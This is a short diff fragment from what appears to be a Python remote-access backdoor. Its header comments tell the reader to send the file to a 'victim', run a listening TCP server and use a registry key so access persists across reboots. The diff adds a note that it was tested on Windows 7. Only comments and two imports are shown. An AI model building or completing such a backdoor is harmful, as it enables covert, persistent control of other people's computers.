@@ -3,6 +3,7 @@
 #Launch the TCP-server.py, send this to the victim and voila
 #This backdoor is persistence, modify the registry key on windows and every time the victim turns on the computer You should
 #have the tcp-server listening, just go brow #JustGo Infect just once and maintaing acess 4ever
+#Tested on Windows 7 x64 Ultimate and Home Premium.
 
 import socket 
 import subprocess 
